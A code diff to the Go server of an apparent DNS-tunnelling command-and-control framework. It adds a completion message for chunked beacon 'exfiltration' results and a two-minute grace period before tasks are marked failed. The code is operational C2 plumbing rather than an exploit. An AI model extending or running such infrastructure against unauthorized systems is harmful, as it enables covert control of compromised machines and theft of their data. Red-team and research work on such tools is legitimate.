@@ -906,6 +906,15 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		response = c2.handleData(parts, isDuplicate)
 		validMessage = true
 
+	case "RESULT_COMPLETE":
+		// RESULT_COMPLETE|id|taskID|totalChunks
+		parts := strings.SplitN(decoded, "|", 4)
+		if len(parts) < 4 {
+			return "", false
+		}
+		response = c2.handleResultComplete(parts, isDuplicate)
+		validMessage = true
+
 	default:
 		// Only log if debug mode (reduces noise from random DNS queries)
 		if c2.debug {
@@ -1128,36 +1137,40 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 				}
 
 				// Task was sent but beacon checked in without starting exfiltration
-				// This means the beacon either didn't receive it or couldn't execute it
-				// Mark as failed instead of resending
+				// Give beacon time to execute before marking as failed (task execution may take time)
+				// Only mark as failed if sent >2 minutes ago without any result chunks
 				c2.mutex.Lock()
 				if storedTask, exists := c2.tasks[task.ID]; exists {
 					if storedTask.Status == "sent" && storedTask.SentAt != nil {
-						// Beacon checked in but didn't start task - mark as failed
-						storedTask.Status = "failed"
-						storedTask.Result = "Task failed: Beacon checked in without starting execution"
-						beacon.CurrentTask = "" // Clear so next task can be delivered
-						logf("[C2] Task %s marked as FAILED for beacon %s (sent but not executed)", task.ID, beaconID)
+						// Check if task has been sent long enough to consider it failed
+						timeSinceSent := time.Since(*storedTask.SentAt)
+						if timeSinceSent > 2*time.Minute {
+							// Beacon checked in but didn't start task after 2 minutes - mark as failed
+							storedTask.Status = "failed"
+							storedTask.Result = "Task failed: Beacon checked in without starting execution"
+							beacon.CurrentTask = "" // Clear so next task can be delivered
+							logf("[C2] Task %s marked as FAILED for beacon %s (sent but not executed after %v)", task.ID, beaconID, timeSinceSent)
 
-						// Update in database
-						if c2.db != nil {
-							go func(tid, result string) {
-								if err := c2.db.UpdateTaskStatus(tid, "failed"); err != nil && c2.debug {
-									logf("[C2] Failed to update task status in database: %v", err)
-								}
-								if err := c2.db.SaveTaskResult(tid, beaconID, result, 1, 1); err != nil && c2.debug {
-									logf("[C2] Failed to save task result in database: %v", err)
-								}
-							}(task.ID, storedTask.Result)
-						}
+							// Update in database
+							if c2.db != nil {
+								go func(tid, result string) {
+									if err := c2.db.UpdateTaskStatus(tid, "failed"); err != nil && c2.debug {
+										logf("[C2] Failed to update task status in database: %v", err)
+									}
+									if err := c2.db.SaveTaskResult(tid, beaconID, result, 1, 1); err != nil && c2.debug {
+										logf("[C2] Failed to save task result in database: %v", err)
+									}
+								}(task.ID, storedTask.Result)
+							}
 
-						// Notify Master
-						if masterClient != nil {
-							go func(tid, bid, result string) {
-								if _, err := masterClient.SubmitResult(tid, bid, 1, 1, result); err != nil && c2.debug {
-									logf("[C2] Failed to notify Master of task failure: %v", err)
-								}
-							}(task.ID, beaconID, storedTask.Result)
+							// Notify Master
+							if masterClient != nil {
+								go func(tid, bid, result string) {
+									if _, err := masterClient.SubmitResult(tid, bid, 1, 1, result); err != nil && c2.debug {
+										logf("[C2] Failed to notify Master of task failure: %v", err)
+									}
+								}(task.ID, beaconID, storedTask.Result)
+							}
 						}
 					}
 				}
@@ -1186,35 +1199,41 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 				return "ACK" // No task to deliver
 			} else if storedTask.Status == "sent" {
 				// Task already sent but beacon checked in without starting it
-				// Mark as failed and remove from queue
-				beacon.TaskQueue = beacon.TaskQueue[1:]
-				storedTask.Status = "failed"
-				storedTask.Result = "Task failed: Sent but not executed by beacon"
-				logf("[C2] Task %s marked as FAILED for beacon %s (sent but beacon didn't execute)", task.ID, beaconID)
+				// Only mark as failed if sent >2 minutes ago (give beacon time to execute)
+				if storedTask.SentAt != nil && time.Since(*storedTask.SentAt) > 2*time.Minute {
+					// Mark as failed and remove from queue
+					beacon.TaskQueue = beacon.TaskQueue[1:]
+					storedTask.Status = "failed"
+					storedTask.Result = "Task failed: Sent but not executed by beacon"
+					logf("[C2] Task %s marked as FAILED for beacon %s (sent but beacon didn't execute)", task.ID, beaconID)
 
-				// Update in database
-				if c2.db != nil {
-					go func(tid, bid, result string) {
-						if err := c2.db.UpdateTaskStatus(tid, "failed"); err != nil && c2.debug {
-							logf("[C2] Failed to update task status in database: %v", err)
-						}
-						if err := c2.db.SaveTaskResult(tid, bid, result, 1, 1); err != nil && c2.debug {
-							logf("[C2] Failed to save task result in database: %v", err)
-						}
-					}(task.ID, beaconID, storedTask.Result)
+					// Update in database
+					if c2.db != nil {
+						go func(tid, bid, result string) {
+							if err := c2.db.UpdateTaskStatus(tid, "failed"); err != nil && c2.debug {
+								logf("[C2] Failed to update task status in database: %v", err)
+							}
+							if err := c2.db.SaveTaskResult(tid, bid, result, 1, 1); err != nil && c2.debug {
+								logf("[C2] Failed to save task result in database: %v", err)
+							}
+						}(task.ID, beaconID, storedTask.Result)
+					}
+
+					// Notify Master
+					if masterClient != nil {
+						go func(tid, bid, result string) {
+							if _, err := masterClient.SubmitResult(tid, bid, 1, 1, result); err != nil && c2.debug {
+								logf("[C2] Failed to notify Master of task failure: %v", err)
+							}
+						}(task.ID, beaconID, storedTask.Result)
+					}
+
+					c2.mutex.Unlock()
+					return "ACK" // Task failed, check for next task
 				}
-
-				// Notify Master
-				if masterClient != nil {
-					go func(tid, bid, result string) {
-						if _, err := masterClient.SubmitResult(tid, bid, 1, 1, result); err != nil && c2.debug {
-							logf("[C2] Failed to notify Master of task failure: %v", err)
-						}
-					}(task.ID, beaconID, storedTask.Result)
-				}
-
+				// Task sent recently, beacon may still be executing - leave in queue
 				c2.mutex.Unlock()
-				return "ACK" // Task failed, check for next task
+				return "ACK" // Give beacon more time
 			} else if storedTask.Status == "exfiltrating" {
 				// Task being exfiltrated - remove from queue and don't re-send
 				beacon.TaskQueue = beacon.TaskQueue[1:]
@@ -1697,6 +1716,62 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 			}
 		}
 		c2.mutex.Unlock()
+	}
+
+	return "ACK"
+}
+
+// handleResultComplete processes the completion message from beacon
+// This is the final signal that all chunks have been sent successfully
+// Only when this message arrives should the task be marked as completed
+func (c2 *C2Manager) handleResultComplete(parts []string, isDuplicate bool) string {
+	if len(parts) < 4 {
+		return "ERROR"
+	}
+
+	beaconID := parts[1]
+	taskID := parts[2]
+	totalChunks, _ := strconv.Atoi(parts[3])
+
+	logf("[C2] Beacon %s completed exfiltration for task %s (%d chunks)", beaconID, taskID, totalChunks)
+
+	// Clear beacon's current task
+	c2.mutex.Lock()
+	if beacon, exists := c2.beacons[beaconID]; exists {
+		if beacon.CurrentTask == taskID {
+			beacon.CurrentTask = ""
+		}
+	}
+
+	// Clean up expected results tracking
+	delete(c2.expectedResults, taskID)
+
+	// Flush any remaining batched chunks immediately
+	if len(c2.resultBatchBuffer[taskID]) > 0 {
+		batch := c2.resultBatchBuffer[taskID]
+		delete(c2.resultBatchBuffer, taskID)
+		if timer, exists := c2.resultBatchTimer[taskID]; exists {
+			timer.Stop()
+			delete(c2.resultBatchTimer, taskID)
+		}
+		c2.mutex.Unlock()
+
+		// Flush batch synchronously before notifying completion
+		if masterClient != nil {
+			c2.flushResultBatch(batch, taskID, masterClient)
+		}
+
+		c2.mutex.Lock()
+	}
+	c2.mutex.Unlock()
+
+	// Notify Master that exfiltration is complete
+	if masterClient != nil && !isDuplicate {
+		go func() {
+			if err := masterClient.MarkTaskComplete(taskID, beaconID, totalChunks); err != nil && c2.debug {
+				logf("[C2] Failed to notify Master of task completion: %v", err)
+			}
+		}()
 	}
 
 	return "ACK"
